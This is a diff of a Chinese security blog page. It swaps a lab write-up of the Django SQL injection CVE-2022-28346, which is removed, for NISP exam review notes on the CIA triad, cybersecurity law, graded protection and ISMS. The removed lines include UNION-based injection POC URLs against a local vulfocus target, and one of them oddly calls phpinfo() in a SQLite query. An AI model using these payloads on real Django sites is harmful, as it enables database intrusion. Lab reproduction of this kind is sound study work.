@@ -3,7 +3,7 @@
 <html lang="zh-CN">
     <head>
         <meta charset="UTF-8">
-        <title>CVE-2022-28346 Django SQL注入 | zfmx&#39;s Blog</title>
+        <title>nisp一级复习：第一章 | zfmx&#39;s Blog</title>
         <meta name="author" content="zfmx">
         <meta name="description" content="">
         <meta name="keywords" content="">
@@ -128,22 +128,22 @@
 
                 <div class="article">
     <div>
-        <h1>CVE-2022-28346 Django SQL注入 </h1>
+        <h1>nisp一级复习：第一章 </h1>
     </div>
     <div class="info">
         <span class="date">
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2023/2/11
+            2023/2/26
         </span>
         
         <span class="category">
-            <a href="/categories/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+            <a href="/categories/nisp%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/">
                 <span class="icon">
                     <i class="fa-solid fa-bookmark fa-fw"></i>
                 </span>
-                CVE漏洞复现
+                nisp复习笔记
             </a>
         </span>
         
@@ -155,12 +155,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/CVE%E6%BC%8F%E6%B4%9E/" style="color: #03a9f4">CVE漏洞</a>
-            </span>
-            
-            <span class="tag">
-                
-                <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="color: #ff7d73">SQL注入</a>
+                <a href="/tags/nisp/" style="color: #ffa2c4">nisp</a>
             </span>
             
         </span>
@@ -168,44 +163,114 @@
     </div>
     
     <div class="content" v-pre>
-        <h3 id="影响范围："><a href="#影响范围：" class="headerlink" title="影响范围："></a>影响范围：</h3><ul>
-<li>4.0 &lt;&#x3D; Django &lt; 4.0.4</li>
-<li>3.2 &lt;&#x3D; Django &lt; 3.2.13</li>
-<li>2.2 &lt;&#x3D; Django &lt; 2.2.28</li>
-</ul>
+        <p> 信息安全与网络空间安全</p>
+<p> 网络安全法律法规</p>
+<p> 网络空间安全政策与标准（等保）</p>
+<p> 信息安全管理（ISMS）</p>
 <span id="more"></span>
 
-<h3 id="一、Django简介"><a href="#一、Django简介" class="headerlink" title="一、Django简介"></a>一、Django简介</h3><p>Python下有许多款不同的 Web 框架。Django是重量级选手中最有代表性的一位。许多成功的网站和APP都基于Django，Django 是一个开放源代码的 Web 应用框架，由 Python 写成。</p>
-<h3 id="二、影响范围"><a href="#二、影响范围" class="headerlink" title="二、影响范围"></a>二、影响范围</h3><ul>
-<li>4.0 &lt;&#x3D; Django &lt; 4.0.4</li>
-<li>3.2 &lt;&#x3D; Django &lt; 3.2.13</li>
-<li>2.2 &lt;&#x3D; Django &lt; 2.2.28</li>
+<h2 id="一、信息安全与网络空间安全"><a href="#一、信息安全与网络空间安全" class="headerlink" title="一、信息安全与网络空间安全"></a>一、信息安全与网络空间安全</h2><p>​		信息安全：为数据处理系统建立和采取技术管理的安全保护，保护计算机硬件、软件、数据不因偶然或者恶意的原因而受到破坏、更改、泄露</p>
+<h4 id="信息安全问题的根源："><a href="#信息安全问题的根源：" class="headerlink" title="信息安全问题的根源："></a><strong>信息安全问题的根源：</strong></h4><p>​				内因：信息系统复杂性导致漏洞的存在不可避免（过程、结构、应用复杂性）</p>
+<p>​				外因：威胁与破坏，员工误操作、外部攻击、自然环境破坏</p>
+<h4 id="信息的基本属性（CIA）"><a href="#信息的基本属性（CIA）" class="headerlink" title="信息的基本属性（CIA）"></a><strong>信息的基本属性（CIA）</strong></h4><ul>
+<li>机密性		防止信息有意无意的非授权泄露<ul>
+<li>使用权是否可控</li>
+<li>数据是否有标识</li>
+<li>访问是否有控制</li>
+<li>访问是否有记录</li>
 </ul>
-<h3 id="三、漏洞简介"><a href="#三、漏洞简介" class="headerlink" title="三、漏洞简介"></a>三、漏洞简介</h3><p> 在 2.2.28 之前的 Django 2.2、3.2.13 之前的 3.2 和 4.0.4 之前的 4.0 中发现了一个问题。QuerySet.annotate()、aggregate() 和 extra() 方法会通过精心制作的字典（带有字典扩展）作为传递的 **kwargs 在列别名中进行 SQL 注入</p>
-<h3 id="四、漏洞复现："><a href="#四、漏洞复现：" class="headerlink" title="四、漏洞复现："></a>四、漏洞复现：</h3><p><strong>1.打开靶场环境</strong></p>
-<p>​		在vulfocus靶场中拉取CVE-2022-28346漏洞镜像，将其打开</p>
-<img src="/2023/02/11/CVE-2022-28346-Django-SQL%E6%B3%A8%E5%85%A5/image-20230211173653919.png" alt="image-20230211173653919" style="zoom:80%;">
-
-<p><strong>2.访问给出的地址</strong></p>
-<p><a target="_blank" rel="noopener" href="http://10.0.0.128:22774/">http://10.0.0.128:22774</a></p>
-<p><img src="/2023/02/11/CVE-2022-28346-Django-SQL%E6%B3%A8%E5%85%A5/image-20230211173950989.png" alt="image-20230211173950989"></p>
-<p>通过查看404页面发现目录 demo&#x2F;</p>
-<p><img src="/2023/02/11/CVE-2022-28346-Django-SQL%E6%B3%A8%E5%85%A5/image-20230211175913032.png" alt="image-20230211175913032"></p>
-<p>进入demo查看，发现报错：</p>
-<p><img src="/2023/02/11/CVE-2022-28346-Django-SQL%E6%B3%A8%E5%85%A5/image-20230211180052845.png" alt="image-20230211180052845"></p>
-<p>报错信息：the annotation ‘name’ conficts with a field on the model </p>
-<p>使用报错信息 demo?field&#x3D;demo.name 构造POC </p>
-<pre><code class="http">POC:  http://10.0.0.128:24115/demo/?field=demo.name&quot; FROM &quot;demo_user&quot; union SELECT &quot;1&quot;,sqlite_version(),&quot;3&quot; --
-</code></pre>
-<p><img src="/2023/02/11/CVE-2022-28346-Django-SQL%E6%B3%A8%E5%85%A5/image-20230211174011623.png" alt="image-20230211174011623"></p>
-<p><strong>3.获取flag</strong></p>
-<p>在此注入发现版本号3.34.1，重新改造POC </p>
-<pre><code class="http">POC:  http://10.0.0.128:24115/demo/?field=demo.name&quot; FROM &quot;demo_user&quot; union SELECT &quot;1&quot;,phpinfo(),&quot;3&quot; --
-</code></pre>
-<p>通过ctrl+F 搜索 flag，取得最终的flag</p>
-<p><img src="/2023/02/11/CVE-2022-28346-Django-SQL%E6%B3%A8%E5%85%A5/image-20230211174718552.png" alt="image-20230211174718552"></p>
-<pre><code>flag-&#123;bmh1059bd0b-be31-45cc-bb24-276b1735076f&#125;
-</code></pre>
+</li>
+<li>完整性		数据处于完整状态、没有遭篡改和破坏<ul>
+<li>什么样的数据可能被篡改</li>
+<li>篡改后有什么影响</li>
+<li>是否划分不同权限</li>
+<li>操作是否有记录</li>
+</ul>
+</li>
+<li>可用性        数据和系统在需要时可用<ul>
+<li>如何保证随时可用</li>
+<li>如果无法使用如何应对（备份&#x2F;修复&#x2F;手工接替）</li>
+</ul>
+</li>
+</ul>
+<p>		</p>
+<p>​	其他属性：真实性、可问责性、不可否认性、可靠性</p>
+<h4 id="通信安全发展过程"><a href="#通信安全发展过程" class="headerlink" title="通信安全发展过程"></a><strong>通信安全发展过程</strong></h4><ul>
+<li><strong>二十世纪 四十到七十年代</strong>       主要注重传输过程中的数据保护<ul>
+<li>安全威胁：搭线窃听、密码学分析</li>
+<li>核心思想：密码技术进行通信保密</li>
+<li>安全措施：加密</li>
+</ul>
+</li>
+<li><strong>二十世纪 七十到九十年代</strong>       主要注重数据处理和储存时的数据保护<ul>
+<li>安全威胁：非法访问、恶意代码、弱口令</li>
+<li>核心思想：预防、检测和减少计算机系统、用户执行时授权造成的影响</li>
+<li>安全措施：通过操作系统的访问控制技术</li>
+</ul>
+</li>
+<li><strong>二十世纪 九十年代后</strong>               主要注重整体安全<ul>
+<li>安全威胁：网络入侵、病毒破坏、信息对抗</li>
+<li>核心思想：重点保护比数据更精炼的信息</li>
+<li>安全措施：防火墙、病毒扫描、漏洞扫描、入侵检测、PKI、VPN</li>
+</ul>
+</li>
+</ul>
+<h2 id="二、网络安全法律法规"><a href="#二、网络安全法律法规" class="headerlink" title="二、网络安全法律法规"></a>二、网络安全法律法规</h2><p>​		三次审议，两次公开征求意见和修改《网络安全法》</p>
+<p>​		实行等级保护制度，对关键信息基础设施建设要求：同步规划、同步建设、同步使用</p>
+<p>​		组织和企业的义务：一年一次风险评估机制，国家审查安全采购，应急预案机制，数据境内留存，人员安全管理。</p>
+<h2 id="三、网络空间安全政策与标准"><a href="#三、网络空间安全政策与标准" class="headerlink" title="三、网络空间安全政策与标准"></a>三、网络空间安全政策与标准</h2><p>​		信息安全等级保护标准体系工作流程：定级、备案、差距分析、建议整改、验收测评、定期复查</p>
+<p>​		等保核心思想：对保护对象按等级划分，按标准进行建设、管理、监督</p>
+<h4 id="划分等级："><a href="#划分等级：" class="headerlink" title="划分等级："></a><strong>划分等级：</strong></h4><ol>
+<li>用户自主保护级</li>
+<li>系统审计保护级</li>
+<li>安全标记保护级</li>
+<li>结构化保护级</li>
+<li>访问验证保护级</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>一般损害</th>
+<th>严重损害</th>
+<th>特别严重损害</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>公民法人和其他组织的合法权益</td>
+<td>一</td>
+<td>二</td>
+<td>二</td>
+</tr>
+<tr>
+<td>社会秩序、公共利益</td>
+<td>二</td>
+<td>三</td>
+<td>四</td>
+</tr>
+<tr>
+<td>国家安全</td>
+<td>三</td>
+<td>四</td>
+<td>五</td>
+</tr>
+</tbody></table>
+<h2 id="四、信息安全管理"><a href="#四、信息安全管理" class="headerlink" title="四、信息安全管理"></a>四、信息安全管理</h2><h4 id="信息安全管理体系（ISMS）"><a href="#信息安全管理体系（ISMS）" class="headerlink" title="信息安全管理体系（ISMS）"></a><strong>信息安全管理体系（ISMS）</strong></h4><ul>
+<li>ISO&#x2F;IEC 27001 标准族</li>
+<li>GB&#x2F;T 22080 标准族</li>
+</ul>
+<h4 id="使用PDCA过程："><a href="#使用PDCA过程：" class="headerlink" title="使用PDCA过程："></a>使用PDCA过程：</h4><ul>
+<li>P(plan)	计划</li>
+<li>D(do)	  实施</li>
+<li>C(check) 检查</li>
+<li>A(act)      行动</li>
+</ul>
+<h4 id="文档化与文件控制："><a href="#文档化与文件控制：" class="headerlink" title="文档化与文件控制："></a>文档化与文件控制：</h4><ul>
+<li>一级文件：由高级管理层发布的方针、政策</li>
+<li>二级文件：由组织管理者代表发布的制度、流程、规范</li>
+<li>三级文件：使用手册、操作指南、作业指导书</li>
+<li>四级文件：日志、记录、检查表、模板、表单</li>
+</ul>
 
     </div>
     
